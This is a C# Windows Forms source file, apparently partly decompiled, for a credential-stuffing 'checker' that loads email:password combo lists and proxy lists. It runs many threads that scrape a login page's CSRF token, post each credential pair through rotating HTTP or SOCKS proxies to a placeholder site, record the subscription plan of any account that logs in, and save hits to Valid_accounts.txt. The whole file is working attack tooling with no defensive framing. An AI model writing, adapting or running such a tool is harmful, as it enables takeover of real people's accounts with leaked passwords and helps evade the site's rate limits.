using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;

namespace Gui
{
    public partial class checker : Form
    {
		public const int WM_NCLBUTTONDOWN = 0xA1;
		public const int HT_CAPTION = 0x2;
		[DllImportAttribute("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		[DllImportAttribute("user32.dll")]
		public static extern bool ReleaseCapture();
		// Token: 0x06000009 RID: 9
		[DllImport("urlmon.dll")]
		[return: MarshalAs(UnmanagedType.Error)]
		private static extern int CoInternetSetFeatureEnabled(int int_8, [MarshalAs(UnmanagedType.U4)] int int_9, bool bool_0);

		// Token: 0x0600000A RID: 10
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int int_8, int int_9, int int_10, int int_11, int int_12, int int_13);

		// Token: 0x0600000B RID: 11 RVA: 0x0000210C File Offset: 0x0000030C

		private void method_0(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000210C File Offset: 0x0000030C
		private void method_1(object sender, EventArgs e)
		{
		}
		public checker()
        {
            InitializeComponent();
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Close();
        }

		private void method_3(object sender, EventArgs e)
		{
		}

		// Token: 0x06000012 RID: 18 RVA: 0x0000229C File Offset: 0x0000049C
		public void method_4(object sender, EventArgs e)
		{
			this.string_5 = DateTime.Now.ToString("dd-MM-yy HH-mm-ss");
			this.string_4 = "Results\\Result " + this.string_5;
			bool flag = this.int_0 == 0;
			if (flag)
			{
				MessageBox.Show("Load Accounts.");
			}
			else
			{
				bool flag2 = this.int_1 == 0;
				if (flag2)
				{
					MessageBox.Show("Load Proxies.");
				}
				else
				{
					switch (this.siticoneRoundedComboBox1.SelectedIndex)
					{
						case 0:
							this.proxyType_0 = ProxyType.Http;
							break;
						case 1:
							this.proxyType_0 = ProxyType.Socks4;
							break;
						case 2:
							this.proxyType_0 = ProxyType.Socks5;
							break;
						default:
							MessageBox.Show("Choose Proxy type");
							return;
					}
					this.int_2 = 0;
					this.int_3 = 0;
					this.string_2 = null;
					this.string_3 = null;
					this.int_5 = 0;
					this.int_7 = 0;
					this.int_6 = this.int_0;
					this.queue_0 = new Queue();
					Directory.CreateDirectory(this.string_4);
					for (int i = 0; i < this.int_0; i++)
					{
						this.queue_0.Enqueue(this.string_0[i]);
					}
					this.int_4 = Convert.ToInt32(this.ZekhTextBox1.Text);
					this.thread_0 = new Thread[this.int_4];
					for (int j = 0; j < this.int_4; j++)
					{
						this.thread_0[j] = new Thread(new ThreadStart(this.method_5));
						this.thread_0[j].IsBackground = true;
						this.thread_0[j].Start();
					}
					this.timer1.Enabled = true;
				}
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x0000248C File Offset: 0x0000068C
		public static string smethod_0(string string_6, string string_7, string string_8)
		{
			return Regex.Match(string_6, string_7 + "(.*?)" + string_8).Groups[1].Value;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000024C0 File Offset: 0x000006C0
		public void method_5()
		{
			string proxyAddress = this.string_1[this.random_0.Next(0, this.int_1)];
			while (this.queue_0.Count > 0)
			{
				object obj = this.object_0;
				object obj2 = obj;
				string text;
				lock (obj2)
				{
					text = this.queue_0.Peek().ToString().TrimEnd(new char[]
					{
						'\r'
					}).Trim();
					this.queue_0.Dequeue();
				}
				string[] array = text.Split(new char[]
				{
					':'
				});
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.Proxy = ProxyClient.Parse(this.proxyType_0, proxyAddress);
						CookieDictionary cookies = new CookieDictionary(false);
						httpRequest.Cookies = cookies;
						httpRequest.ConnectTimeout = 20000;
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = true;
						httpRequest.KeepAlive = true;
						httpRequest.UserAgent = Http.ChromeUserAgent();
						string string_ = httpRequest.Get("https://customhere.com", null).ToString();
						string value = checker.smethod_0(string_, "id=\"csrf\" type=\"hidden\" name=\"csrf\" value=\"", "\"/>");
						httpRequest.AddParam("user_email", array[0]);
						httpRequest.AddParam("password", array[1]);
						httpRequest.AddParam("csrf", value);
						string text2 = httpRequest.Post("https://customhere.com").ToString();
						bool flag2 = text2.Contains("{}");
						if (flag2)
						{
							string string_2 = httpRequest.Get("https://customhere.com", null).ToString();
							string str = checker.smethod_0(string_2, "{\"id\":\"", "\",");
							string string_3 = httpRequest.Get("https://customhere.com" + str + "&zzcb=31594021", null).ToString();
							string text3 = checker.smethod_0(string_3, "\"subscription_plan\": {\"name\":\"", "\",");
							bool flag3 = text3 == "";
							if (flag3)
							{
								text3 = "None";
							}
							obj = this.object_0;
							object obj3 = obj;
							lock (obj3)
							{
								Array.Resize<string>(ref this.string_2, this.int_2 + 1);
								this.string_2[this.int_2] = text + " ------> Subsciption: " + text3;
								this.int_2++;
								this.int_5++;
								this.int_6--;
								continue;
							}
						}
						obj = this.object_0;
						object obj4 = obj;
						lock (obj4)
						{
							this.int_3++;
						}
						this.int_5++;
						this.int_6--;
					}
				}
				catch
				{
					this.int_7++;
					this.queue_0.Enqueue(text);
					proxyAddress = this.string_1[this.random_0.Next(0, this.int_1)];
				}
			}
			bool flag6 = this.int_5 == this.int_0;
			if (flag6)
			{
				this.method_6();
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002884 File Offset: 0x00000A84
		public void method_6()
		{
			for (int i = 0; i < this.int_4; i++)
			{
				this.thread_0[i] = new Thread(new ThreadStart(this.method_5));
				this.thread_0[i].IsBackground = true;
				this.thread_0[i].Abort();
			}
		}

		private void siticoneRoundedButton2_Click(object sender, EventArgs e)
        {
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Text files | * .txt";
				bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					this.string_0 = File.ReadAllText(openFileDialog.FileName).Replace(";", ":").Split(new char[]
					{
						'\n'
					}).Distinct<string>().ToArray<string>();
					this.int_0 = this.string_0.Length;
					this.int_6 = this.int_0;
					this.gunaLabel17.Text = this.int_0.ToString();
					this.gunaLabel4.Text = this.int_0.ToString();
				}
			}
		}

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }

		// Token: 0x04000004 RID: 4
		private Point point_0;

		// Token: 0x04000005 RID: 5
		public string[] string_0;

		// Token: 0x04000006 RID: 6
		public string[] string_1;

		// Token: 0x04000007 RID: 7
		public string[] string_2 = new string[0];

		// Token: 0x04000008 RID: 8
		public string[] string_3 = new string[0];

		// Token: 0x04000009 RID: 9
		public int int_0;

		// Token: 0x0400000A RID: 10
		public int int_1;

		// Token: 0x0400000B RID: 11
		public int int_2;

		// Token: 0x0400000C RID: 12
		public int int_3;

		// Token: 0x0400000D RID: 13
		public int int_4;

		// Token: 0x0400000E RID: 14
		public int int_5;

		// Token: 0x0400000F RID: 15
		public int int_6;

		// Token: 0x04000010 RID: 16
		public int int_7;

		// Token: 0x04000011 RID: 17
		public object object_0 = new object();

		// Token: 0x04000012 RID: 18
		public Thread[] thread_0;

		// Token: 0x04000013 RID: 19
		public ProxyType proxyType_0;

		// Token: 0x04000014 RID: 20
		public Random random_0 = new Random();

		// Token: 0x04000015 RID: 21
		public Queue queue_0;

		// Token: 0x04000016 RID: 22
		private string string_4 = "Results";

		// Token: 0x04000017 RID: 23
		private string string_5 = "";

		private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Text files | * .txt";
                bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
                if (flag)
                {
                    this.string_1 = File.ReadAllLines(openFileDialog.FileName).Distinct<string>().ToArray<string>();
                    this.int_1 = this.string_1.Length;
                    this.gunaLabel3.Text = this.int_1.ToString();
                }
            }
        }

        private void siticoneRoundedButton3_Click(object sender, EventArgs e)
        {
			this.string_5 = DateTime.Now.ToString("dd-MM-yy HH-mm-ss");
			this.string_4 = "Results\\Result " + this.string_5;
			bool flag = this.int_0 == 0;
			if (flag)
			{
				MessageBox.Show("Load Accounts.");
			}
			else
			{
				bool flag2 = this.int_1 == 0;
				if (flag2)
				{
					MessageBox.Show("Load Proxies.");
				}
				else
				{
					switch (this.siticoneRoundedComboBox1.SelectedIndex)
					{
						case 0:
							this.proxyType_0 = ProxyType.Http;
							break;
						case 1:
							this.proxyType_0 = ProxyType.Socks4;
							break;
						case 2:
							this.proxyType_0 = ProxyType.Socks5;
							break;
						default:
							MessageBox.Show("Choose Proxy type");
							return;
					}
					this.int_2 = 0;
					this.int_3 = 0;
					this.string_2 = null;
					this.string_3 = null;
					this.int_5 = 0;
					this.int_7 = 0;
					this.int_6 = this.int_0;
					this.queue_0 = new Queue();
					Directory.CreateDirectory(this.string_4);
					for (int i = 0; i < this.int_0; i++)
					{
						this.queue_0.Enqueue(this.string_0[i]);
					}
					this.int_4 = Convert.ToInt32(this.ZekhTextBox1.Text);
					this.thread_0 = new Thread[this.int_4];
					for (int j = 0; j < this.int_4; j++)
					{
						this.thread_0[j] = new Thread(new ThreadStart(this.method_5));
						this.thread_0[j].IsBackground = true;
						this.thread_0[j].Start();
					}
					this.timer1.Enabled = true;
				}
			}
		}

        private void timer1_Tick(object sender, EventArgs e)
        {
			this.gunaLabel9.Text = this.int_2.ToString();
			this.gunaLabel11.Text = this.int_3.ToString();
			this.gunaLabel13.Text = this.int_5.ToString();
			this.gunaLabel17.Text = this.int_6.ToString();
			this.gunaLabel15.Text = this.int_7.ToString();
			bool flag = this.int_2 != this.result.Lines.Count<string>();
			if (flag)
			{
				this.result.Lines = this.string_2;
				File.WriteAllLines(this.string_4 + "\\Valid_accounts.txt", this.string_2);
			}
		}

        private void checker_Load(object sender, EventArgs e)
        {
			this.siticoneRoundedComboBox1.SelectedIndex = 0;
		}

        private void siticoneRoundedButton4_Click(object sender, EventArgs e)
        {
			this.method_6();
			this.timer1.Enabled = false;
		}

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
			Move_Form(Handle, e);
		}

		public void Move_Form(IntPtr Handle, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				ReleaseCapture();
				SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
			}
		}
	}
}
